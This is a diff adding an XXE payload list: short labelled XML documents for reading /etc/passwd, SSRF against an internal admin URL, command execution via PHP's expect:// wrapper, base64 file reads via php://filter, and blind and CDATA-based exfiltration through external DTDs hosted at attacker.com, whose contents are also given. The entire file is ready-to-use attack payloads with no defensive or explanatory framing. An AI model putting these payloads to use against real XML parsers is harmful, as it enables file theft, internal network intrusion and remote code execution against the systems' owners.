@@ -1,0 +1,55 @@
+# Basic XXE - Read file
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+# Basic XXE - SSRF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://internal-server/admin">
+]>
+<root>&xxe;</root>
+
+# XXE via parameter entity (blind)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<root>test</root>
+
+# evil.dtd content:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfil;
+
+# XXE to RCE (expect wrapper - PHP)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "expect://id">
+]>
+<root>&xxe;</root>
+
+# XXE with PHP filter (base64)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<root>&xxe;</root>
+
+# XXE with CDATA exfiltration
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/cdata.dtd">
+  %dtd;
+]>
+<root>&all;</root>
+
+# cdata.dtd content:
+<!ENTITY all "%start;%file;%end;">
